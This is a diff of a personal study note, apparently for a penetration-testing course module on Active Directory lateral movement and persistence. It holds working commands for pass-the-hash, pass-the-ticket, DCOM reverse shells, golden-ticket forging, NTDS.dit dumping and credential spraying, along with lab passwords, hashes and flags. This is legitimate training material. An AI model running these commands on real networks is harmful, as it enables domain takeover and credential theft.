@@ -3,8 +3,8 @@
 Module 24. Builds directly on [[Attacking Active Directory Authentication|Module 23]] (credential harvesting) and [[Active Directory Introduction and Enumeration|Module 22]] (enumeration/target identification). The core idea: once we have NTLM hashes or Kerberos tickets, we do not need plaintext passwords to move around the domain.
 
 **Two halves:**
-1. **Lateral movement** (§24.1) — get code execution on other machines using harvested credentials
-2. **Persistence** (§24.2) — forge tickets that survive password changes
+1. **Lateral movement** (§24.1), get code execution on other machines using harvested credentials
+2. **Persistence** (§24.2), forge tickets that survive password changes
 
 ---
 
@@ -108,7 +108,7 @@ Enter-PSSession 1
 # Prompt changes to: [192.168.50.73]: PS C:\Users\jen\Documents>
 ```
 
-> 🔁 Similar to: [[Password Attacks#sekurlsa::pth → new PS window|Module 23]] — winrs is the command-line equivalent of evil-winrm and New-PSSession; all three use WinRM under the hood.
+> 🔁 Similar to: [[Password Attacks#sekurlsa::pth → new PS window|Module 23]], winrs is the command-line equivalent of evil-winrm and New-PSSession; all three use WinRM under the hood.
 
 > 📸 Screenshot: Enter-PSSession output confirming corp\jen on FILES04
 
@@ -117,7 +117,7 @@ Enter-PSSession 1
 Q1: Which PowerShell cmdlet has been used to create a WMI session?
 **Answer: New-CimSession**
 
-> ✅ Done: 24.1.1 VM Group 2 — RDP as jeff to CLIENT74 (192.168.249.74). PowerShell WMI CIM session: New-CimSession -ComputerName web04 -Credential jen/Nexus123! -SessionOption DCOM → Invoke-CimMethod Win32_Process.Create with base64 reverse shell → ReturnValue=0, PID 6056 on web04 (192.168.249.72). nc listener caught corp\jen shell. Flag at C:\Users\Administrator\Desktop\flag.txt (not proof.txt). **Flag: OS{d6abd389d265e4cd704851b78d241e2e}**
+> ✅ Done: 24.1.1 VM Group 2. RDP as jeff to CLIENT74 (192.168.249.74). PowerShell WMI CIM session: New-CimSession -ComputerName web04 -Credential jen/Nexus123! -SessionOption DCOM → Invoke-CimMethod Win32_Process.Create with base64 reverse shell → ReturnValue=0, PID 6056 on web04 (192.168.249.72). nc listener caught corp\jen shell. Flag at C:\Users\Administrator\Desktop\flag.txt (not proof.txt). **Flag: OS{d6abd389d265e4cd704851b78d241e2e}**
 
 ---
 
@@ -137,7 +137,7 @@ C:\Tools\SysinternalsSuite\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cm
 # Result: cmd prompt as corp\jen on FILES04
 ```
 
-> 🔍 Worth remembering generally: PsExec needs the ADMIN$ share because it drops psexesvc.exe into C:\Windows via that share. If ADMIN$ is disabled (uncommon on servers, more common on hardened workstations), PsExec fails. The error is "Access is denied" which looks the same as an auth failure — check share availability with `net view \\target /all` when debugging.
+> 🔍 Worth remembering generally: PsExec needs the ADMIN$ share because it drops psexesvc.exe into C:\Windows via that share. If ADMIN$ is disabled (uncommon on servers, more common on hardened workstations), PsExec fails. The error is "Access is denied" which looks the same as an auth failure, check share availability with `net view \\target /all` when debugging.
 
 > 📸 Screenshot: PsExec output showing Microsoft Windows header + corp\jen whoami on FILES04
 
@@ -146,7 +146,7 @@ C:\Tools\SysinternalsSuite\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cm
 Q1: Which share needs to be available in order for PsExec to connect remotely?
 **Answer: ADMIN$**
 
-> ✅ Done: 24.1.2 VM Group 2 — RDP as offsec (lab) to CLIENT74, elevated PowerShell → `PsExec64.exe -i \\web04 -u corp\jen -p Nexus123! cmd` → corp\jen shell on web04. **Flag: OS{8ba1d1345014cf75ac9b23cfafe46b2e}** at C:\Users\jen\Desktop\flag.txt
+> ✅ Done: 24.1.2 VM Group 2. RDP as offsec (lab) to CLIENT74, elevated PowerShell → `PsExec64.exe -i \\web04 -u corp\jen -p Nexus123! cmd` → corp\jen shell on web04. **Flag: OS{8ba1d1345014cf75ac9b23cfafe46b2e}** at C:\Users\jen\Desktop\flag.txt
 
 ---
 
@@ -154,14 +154,14 @@ Q1: Which share needs to be available in order for PsExec to connect remotely?
 
 Pass the Hash abuses the way NTLM works: the hash IS the credential for network authentication. No need to crack it.
 
-**Works only for NTLM authentication** — not Kerberos. So: SMB-based tools (impacket), WMI with NTLM, etc.
+**Works only for NTLM authentication**, not Kerberos. So: SMB-based tools (impacket), WMI with NTLM, etc.
 
 **Prerequisites (same as PsExec):**
 1. SMB reachable (TCP **445**)
 2. File and Printer Sharing enabled
 3. ADMIN$ share available
 4. Target account has local admin rights
-5. Only works for domain accounts and the built-in local Administrator (RID 500) — other local admins blocked by 2014 KB2871997 (LocalAccountTokenFilterPolicy)
+5. Only works for domain accounts and the built-in local Administrator (RID 500), other local admins blocked by 2014 KB2871997 (LocalAccountTokenFilterPolicy)
 
 ```bash
 # From Kali — impacket-wmiexec with NTLM hash
@@ -175,9 +175,9 @@ Other impacket tools accept the same `-hashes :NTLM` syntax:
 - `impacket-smbexec -hashes :HASH domain/user@IP`
 - `impacket-atexec -hashes :HASH domain/user@IP`
 
-> 🔁 Similar to: [[Password Attacks#16.3.4 Pass the Hash|Module 16 §16.3.4]] — same technique, same impacket tools. Module 24 applies it in the AD lateral movement context.
+> 🔁 Similar to: [[Password Attacks#16.3.4 Pass the Hash|Module 16 §16.3.4]], same technique, same impacket tools. Module 24 applies it in the AD lateral movement context.
 
-> 🌐 External: [HackTricks — Pass the Hash](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/ntlm/pass-the-hash.md) | [PayloadsAllTheThings — PtH](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-hash)
+> 🌐 External: [HackTricks. Pass the Hash](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/ntlm/pass-the-hash.md) | [PayloadsAllTheThings. PtH](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-hash)
 
 > 📸 Screenshot: impacket-wmiexec -hashes output showing C:\> prompt as files04\administrator
 
@@ -186,7 +186,7 @@ Other impacket tools accept the same `-hashes :NTLM` syntax:
 Q1: Which TCP port needs to be enabled on the target machine in order for the pass the hash technique to work?
 **Answer: 445** (SMB)
 
-> ✅ Done: 24.1.3 VM Group 2 — from Kali: `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.249.72` → web04\administrator shell. No RDP needed. **Flag: OS{475d4b6b4f1f4d69e66270e8b115327a}** at C:\Users\Administrator\Desktop\flag.txt
+> ✅ Done: 24.1.3 VM Group 2, from Kali: `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.249.72` → web04\administrator shell. No RDP needed. **Flag: OS{475d4b6b4f1f4d69e66270e8b115327a}** at C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
@@ -230,7 +230,7 @@ cd C:\tools\SysinternalsSuite\
 
 > 🔍 Worth remembering generally: always connect by **hostname** when using Kerberos (tickets are issued for SPNs which use hostnames, not IPs). Using the IP falls back to NTLM, which won't have the injected creds and will fail. This is why `psexec.exe \\192.168.50.70` fails but `psexec.exe \\dc1` works.
 
-> 🌐 External: [HackTricks — Overpass the Hash](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.md) | [PayloadsAllTheThings — Overpass the Hash](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#overpass-the-hash)
+> 🌐 External: [HackTricks. Overpass the Hash](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.md) | [PayloadsAllTheThings. Overpass the Hash](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#overpass-the-hash)
 
 > 📸 Screenshot: klist showing jen's TGT (krbtgt) + TGS (cifs/files04) after net use
 
@@ -239,7 +239,7 @@ cd C:\tools\SysinternalsSuite\
 Q1: Which command is used to inspect the current TGT available for the running user?
 **Answer: klist**
 
-> ✅ Done: 24.1.4 VM Group 2 — RDP as offsec/lab to CLIENT76 (192.168.249.76). Elevated PowerShell → Mimikatz `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell` → new PS window. `net use \\web04` triggered AS-REQ/AS-REP → klist confirmed jen TGT (krbtgt) + TGS (cifs/web04). `PsExec.exe \\web04 cmd` (hostname, not IP) → corp\jen shell on web04. **Flag: OS{a65a32f8299cb7ef76b92fe7e965e7ed}** at C:\Users\Administrator\Desktop\flag.txt
+> ✅ Done: 24.1.4 VM Group 2. RDP as offsec/lab to CLIENT76 (192.168.249.76). Elevated PowerShell → Mimikatz `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell` → new PS window. `net use \\web04` triggered AS-REQ/AS-REP → klist confirmed jen TGT (krbtgt) + TGS (cifs/web04). `PsExec.exe \\web04 cmd` (hostname, not IP) → corp\jen shell on web04. **Flag: OS{a65a32f8299cb7ef76b92fe7e965e7ed}** at C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
@@ -283,15 +283,15 @@ ls \\web04\backup
 :: Now succeeds where it was denied before
 ```
 
-> 🔁 Similar to: [[Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]] — silver ticket also uses kerberos::ptt to inject, but with a FORGED ticket. PtT here injects a REAL stolen ticket. Both end up in the session's Kerberos cache.
+> 🔁 Similar to: [[Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]], silver ticket also uses kerberos::ptt to inject, but with a FORGED ticket. PtT here injects a REAL stolen ticket. Both end up in the session's Kerberos cache.
 
-> 🌐 External: [HackTricks — Pass the Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/pass-the-ticket.md) | [PayloadsAllTheThings — PtT](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket)
+> 🌐 External: [HackTricks. Pass the Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/pass-the-ticket.md) | [PayloadsAllTheThings. PtT](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket)
 
 > 📸 Screenshot: klist showing dave's TGS injected into jen's session; ls \\web04\backup listing files
 
 **24.1.5 Labs**
 
-> ✅ Done: 24.1.5 VM Group 1 — RDP as jen/Nexus123! to CLIENT76 (192.168.249.76). Elevated PowerShell → Mimikatz `sekurlsa::tickets /export` → found dave@cifs-web04.kirbi files. `kerberos::ptt [0;86bd0]-0-0-40810000-dave@cifs-web04.kirbi` → klist confirmed dave's TGS injected into jen's session. `ls \\web04\backup` now accessible. **Flag: OS{bf9a45d933721e2ffde31e0951a19b47}** at \\web04\backup\flag.txt
+> ✅ Done: 24.1.5 VM Group 1. RDP as jen/Nexus123! to CLIENT76 (192.168.249.76). Elevated PowerShell → Mimikatz `sekurlsa::tickets /export` → found dave@cifs-web04.kirbi files. `kerberos::ptt [0;86bd0]-0-0-40810000-dave@cifs-web04.kirbi` → klist confirmed dave's TGS injected into jen's session. `ls \\web04\backup` now accessible. **Flag: OS{bf9a45d933721e2ffde31e0951a19b47}** at \\web04\backup\flag.txt
 
 ---
 
@@ -322,9 +322,9 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e <base64>", "7")
 ```
 
-> 🔍 Worth remembering generally: DCOM lateral movement is stealthier than PsExec because it doesn't drop a service binary. The traffic looks like normal COM object instantiation over RPC. The downside: no interactive session — output must be captured via reverse shell.
+> 🔍 Worth remembering generally: DCOM lateral movement is stealthier than PsExec because it doesn't drop a service binary. The traffic looks like normal COM object instantiation over RPC. The downside: no interactive session, output must be captured via reverse shell.
 
-> 🌐 External: [HackTricks — DCOM Lateral Movement](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/lateral-movement/dcom-exec.md) | [PayloadsAllTheThings — DCOM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dcom-lateral-movement)
+> 🌐 External: [HackTricks. DCOM Lateral Movement](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/lateral-movement/dcom-exec.md) | [PayloadsAllTheThings. DCOM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dcom-lateral-movement)
 
 > 📸 Screenshot: DCOM reverse shell output on nc listener showing corp\jen on FILES04
 
@@ -333,7 +333,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -
 Q1: Which MMC method accepts command shell arguments?
 **Answer: ExecuteShellCommand** (Document.ActiveView.ExecuteShellCommand)
 
-> ✅ Done: 24.1.6 VM Group 2 — RDP as jen/Nexus123! to CLIENT74 (192.168.249.74). PowerShell: `[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.249.72"))` → `ExecuteShellCommand("powershell",$null,"<base64 payload>","7")` → nc listener caught corp\jen shell on web04. **Flag: OS{8e65d8304b04e152d5bc02cbde5fed05}** at C:\Users\Administrator\Desktop\flag.txt
+> ✅ Done: 24.1.6 VM Group 2. RDP as jen/Nexus123! to CLIENT74 (192.168.249.74). PowerShell: `[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.249.72"))` → `ExecuteShellCommand("powershell",$null,"<base64 payload>","7")` → nc listener caught corp\jen shell on web04. **Flag: OS{8e65d8304b04e152d5bc02cbde5fed05}** at C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
@@ -349,9 +349,9 @@ A golden ticket is a **forged TGT** signed with the krbtgt NTLM hash. Since the 
 - krbtgt password is only changed when the domain functional level is upgraded from pre-2008 (rare). In practice, krbtgt hashes are often years old.
 - A golden ticket claims any group memberships we want (Domain Admins, Enterprise Admins, etc.)
 - Valid for 10 hours by default, renewable for 7 days (configurable in the ticket)
-- Must use an **existing account** as /user (Microsoft patched this July 2022 — a non-existent username now gets rejected)
+- Must use an **existing account** as /user (Microsoft patched this July 2022, a non-existent username now gets rejected)
 
-> 🌐 External: [HackTricks — Golden Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/golden-ticket.md) | [PayloadsAllTheThings — Golden Ticket](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#golden-ticket)
+> 🌐 External: [HackTricks. Golden Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/golden-ticket.md) | [PayloadsAllTheThings. Golden Ticket](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#golden-ticket)
 
 **Step 1: Get the krbtgt hash (needs Domain Admin access)**
 
@@ -364,7 +364,7 @@ mimikatz # lsadump::lsa /patch
 :: Also note the domain SID: S-1-5-21-1987370270-658905905-1781884369
 ```
 
-> 🔁 Similar to: [[Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23]] — DCSync via `lsadump::dcsync /user:corp\krbtgt` is the preferred stealthy method (no LSASS patch needed). lsadump::lsa /patch is noisier but works when running directly on the DC.
+> 🔁 Similar to: [[Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23]]. DCSync via `lsadump::dcsync /user:corp\krbtgt` is the preferred stealthy method (no LSASS patch needed). lsadump::lsa /patch is noisier but works when running directly on the DC.
 
 **Step 2: Forge and inject the golden ticket (can be done from ANY machine, no admin required)**
 
@@ -399,7 +399,7 @@ C:\Tools\SysinternalsSuite\PsExec.exe \\dc1 cmd.exe
 Q1: Which user's NTLM hash do we need to abuse in order to forge a golden ticket?
 **Answer: krbtgt** (the Kerberos Ticket Granting Ticket account)
 
-> ✅ Done: 24.2.1 VM Group 2 — RDP as CORP\jen/Nexus123! to CLIENT74 (192.168.249.74). Elevated PowerShell → Mimikatz: `kerberos::purge` + `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt` + `misc::cmd`. New cmd window → `PsExec.exe \\dc1 cmd.exe` (hostname required — IP forces NTLM). whoami /groups confirmed Domain Admins + Enterprise Admins + Schema Admins. **Flag: OS{0188daafcfe874e40da7b46ec8669b30}** at C:\Users\Administrator\Desktop\flag.txt
+> ✅ Done: 24.2.1 VM Group 2. RDP as CORP\jen/Nexus123! to CLIENT74 (192.168.249.74). Elevated PowerShell → Mimikatz: `kerberos::purge` + `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt` + `misc::cmd`. New cmd window → `PsExec.exe \\dc1 cmd.exe` (hostname required. IP forces NTLM). whoami /groups confirmed Domain Admins + Enterprise Admins + Schema Admins. **Flag: OS{0188daafcfe874e40da7b46ec8669b30}** at C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
@@ -407,9 +407,9 @@ Q1: Which user's NTLM hash do we need to abuse in order to forge a golden ticket
 
 Volume Shadow Service (VSS) takes snapshots of a volume. `vshadow.exe` (Windows SDK tool) creates shadow copies. As a domain admin on the DC, we can use VSS to copy the NTDS.dit AD database (which is locked by the NTDS service and can't be copied directly while live).
 
-**This gives us ALL domain credentials offline** — no Kerberos or network interaction needed after extraction.
+**This gives us ALL domain credentials offline**, no Kerberos or network interaction needed after extraction.
 
-> 🌐 External: [HackTricks — NTDS (Active Directory credentials)](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntds.md) | [PayloadsAllTheThings — NTDS dump](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-hashes-from-active-directory-database)
+> 🌐 External: [HackTricks. NTDS (Active Directory credentials)](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntds.md) | [PayloadsAllTheThings. NTDS dump](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-hashes-from-active-directory-database)
 
 **Step 1: Create shadow copy of C: (on DC1 as jeffadmin)**
 
@@ -452,7 +452,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 # etc.
 ```
 
-> 🔁 Similar to: [[Password Attacks#16.4 Credential Manager, Pass-the-Hash, NTDS|Module 16]] — NTDS via VSS is one path; DCSync (via Mimikatz or secretsdump with creds) is another. VSS is better when you have local access to the DC and can't run Mimikatz (AV). DCSync is better when you have domain admin creds and want to stay remote.
+> 🔁 Similar to: [[Password Attacks#16.4 Credential Manager, Pass-the-Hash, NTDS|Module 16]]. NTDS via VSS is one path; DCSync (via Mimikatz or secretsdump with creds) is another. VSS is better when you have local access to the DC and can't run Mimikatz (AV). DCSync is better when you have domain admin creds and want to stay remote.
 
 > 🔍 Worth remembering generally: the source path for ntds.dit in the copy command is always the shadow copy device name (the `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\` prefix) plus the normal path within C:. The answer to "what is the designated name for the source location" is the shadow copy device name.
 
@@ -463,11 +463,11 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 Q1: During a shadow copy operation, what is the designated name for the source location from which the ntds.dit is copied?
 **Answer: shadow copy device name** (e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`)
 
-> ✅ Done: 24.2.2 VM Group 2 — RDP as CORP\jeffadmin/BrouhahaTungPerorateBroom2023! to CLIENT74 (192.168.249.74). Elevated PowerShell → Mimikatz `lsadump::dcsync /user:corp\Administrator` → Administrator NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e. From Kali: `impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.249.70` → NT AUTHORITY\SYSTEM on DC1. **Flag: OS{80388d20222e41d17771f8430342f817}** at C:\Users\Administrator\Desktop\flag.txt
+> ✅ Done: 24.2.2 VM Group 2. RDP as CORP\jeffadmin/BrouhahaTungPerorateBroom2023! to CLIENT74 (192.168.249.74). Elevated PowerShell → Mimikatz `lsadump::dcsync /user:corp\Administrator` → Administrator NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e. From Kali: `impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.249.70` → NT AUTHORITY\SYSTEM on DC1. **Flag: OS{80388d20222e41d17771f8430342f817}** at C:\Users\Administrator\Desktop\flag.txt
 
-> ✅ Done: 24.2.2 Capstone VM Group 3 — RDP as leon/HomeTaping199! to CLIENT74 (192.168.249.74). `whoami /groups` showed BUILTIN\Administrators as "deny only" (UAC-filtered token). Sprayed leon's creds: `crackmapexec smb 192.168.249.70-76 -u leon -p 'HomeTaping199!' -d corp.com` → Pwn3d! on FILES04 (192.168.249.73). From Kali: `impacket-wmiexec corp.com/leon:'HomeTaping199!'@192.168.249.73` → shell as leon on FILES04. **Flag: OS{73fa890e36863161262e1bde9a2b649b}** at C:\Users\Administrator\Desktop\proof.txt
+> ✅ Done: 24.2.2 Capstone VM Group 3. RDP as leon/HomeTaping199! to CLIENT74 (192.168.249.74). `whoami /groups` showed BUILTIN\Administrators as "deny only" (UAC-filtered token). Sprayed leon's creds: `crackmapexec smb 192.168.249.70-76 -u leon -p 'HomeTaping199!' -d corp.com` → Pwn3d! on FILES04 (192.168.249.73). From Kali: `impacket-wmiexec corp.com/leon:'HomeTaping199!'@192.168.249.73` → shell as leon on FILES04. **Flag: OS{73fa890e36863161262e1bde9a2b649b}** at C:\Users\Administrator\Desktop\proof.txt
 
-> ✅ Done: 24.2.2 Capstone VM Group 4 — RDP as leon/HomeTaping199! to CLIENT76 (192.168.249.76). BUILTIN\Administrators "deny only" (UAC-filtered). Elevated PS → Mimikatz `sekurlsa::tickets /export` → found dave's `cifs-web04` TGS tickets cached in LSASS. `kerberos::ptt [0;134a0d]-0-0-40810000-dave@cifs-web04.kirbi` → `ls \\web04\backup` → **Flag: OS{8ce85ab4e6843eb73602c91381ef3cac}** at \\web04\backup\proof.txt
+> ✅ Done: 24.2.2 Capstone VM Group 4. RDP as leon/HomeTaping199! to CLIENT76 (192.168.249.76). BUILTIN\Administrators "deny only" (UAC-filtered). Elevated PS → Mimikatz `sekurlsa::tickets /export` → found dave's `cifs-web04` TGS tickets cached in LSASS. `kerberos::ptt [0;134a0d]-0-0-40810000-dave@cifs-web04.kirbi` → `ls \\web04\backup` → **Flag: OS{8ce85ab4e6843eb73602c91381ef3cac}** at \\web04\backup\proof.txt
 
 ---
 
@@ -570,18 +570,18 @@ Technique keyword searches on ippsec.rocks:
 ## Related Boxes
 
 **Genuine technique boxes:**
-- HTB Forest — full chain: AS-REP Roasting → BloodHound → DCSync → golden ticket + WinRM lateral movement. Covers Overpass-the-Hash, PtH, and golden ticket together
-- HTB Sauna — AS-REP fsmith → lkys lateral movement via evil-winrm → DCSync → PtH to Administrator. Best match for PtH + DCSync from this module
-- HTB Active — Kerberoasting Admin account → PsExec with cracked creds (clean PsExec demo, no hash)
-- HTB Object — WinRM lateral movement, ACL abuse, golden ticket for persistence. Best match for golden ticket persistence
+- HTB Forest, full chain: AS-REP Roasting → BloodHound → DCSync → golden ticket + WinRM lateral movement. Covers Overpass-the-Hash, PtH, and golden ticket together
+- HTB Sauna, AS-REP fsmith → lkys lateral movement via evil-winrm → DCSync → PtH to Administrator. Best match for PtH + DCSync from this module
+- HTB Active. Kerberoasting Admin account → PsExec with cracked creds (clean PsExec demo, no hash)
+- HTB Object. WinRM lateral movement, ACL abuse, golden ticket for persistence. Best match for golden ticket persistence
 
 **Adjacent workflow boxes:**
-- HTB Resolute — DnsAdmins abuse, NTDS dump chain
-- HTB Mantis — Kerberoasting + SQL lateral movement; the credential-based lateral movement pattern
-- PG Hutch — WMI lateral movement specifically (rare in public HTB boxes)
-- PG Heist — Pass-the-Hash lateral movement
+- HTB Resolute. DnsAdmins abuse, NTDS dump chain
+- HTB Mantis. Kerberoasting + SQL lateral movement; the credential-based lateral movement pattern
+- PG Hutch. WMI lateral movement specifically (rare in public HTB boxes)
+- PG Heist. Pass-the-Hash lateral movement
 
-**Note on DCOM and Shadow Copy in public labs:** DCOM (MMC20.Application) lateral movement is rarely the primary intended path in public boxes — it's well-documented but not commonly tested. VSS shadow copy for NTDS extraction is more common in enterprise-difficulty machines. DCSync (covered in Module 23) is far more common in public labs than the manual vshadow approach.
+**Note on DCOM and Shadow Copy in public labs:** DCOM (MMC20.Application) lateral movement is rarely the primary intended path in public boxes, it's well-documented but not commonly tested. VSS shadow copy for NTDS extraction is more common in enterprise-difficulty machines. DCSync (covered in Module 23) is far more common in public labs than the manual vshadow approach.
 
 ---
 
@@ -610,7 +610,7 @@ sequenceDiagram
 
 ## Capstone Lessons
 
-> 🔍 Worth remembering generally: **BUILTIN\Administrators "Group used for deny only"** in `whoami /groups` means UAC is filtering the token. The user IS a local admin (their SID is in the Administrators group) but the RDP session strips elevated privileges. Two ways forward: (1) `Start-Process powershell -Verb RunAs` to get a UAC consent dialog and elevate, or (2) look elsewhere — if they're a local admin here, spray their creds to find where they have unfiltered admin access on other machines.
+> 🔍 Worth remembering generally: **BUILTIN\Administrators "Group used for deny only"** in `whoami /groups` means UAC is filtering the token. The user IS a local admin (their SID is in the Administrators group) but the RDP session strips elevated privileges. Two ways forward: (1) `Start-Process powershell -Verb RunAs` to get a UAC consent dialog and elevate, or (2) look elsewhere, if they're a local admin here, spray their creds to find where they have unfiltered admin access on other machines.
 
 > 🔍 Worth remembering generally: **Cached tickets in LSASS from other logged-on users are yours to steal** the moment you have local admin and can run Mimikatz elevated. In the capstone, leon had no useful NTLM creds of his own on CLIENT76, but dave had logged in and left `cifs-web04` TGS tickets sitting in LSASS. `sekurlsa::tickets /export` dumps all of them regardless of whose session they came from.
 
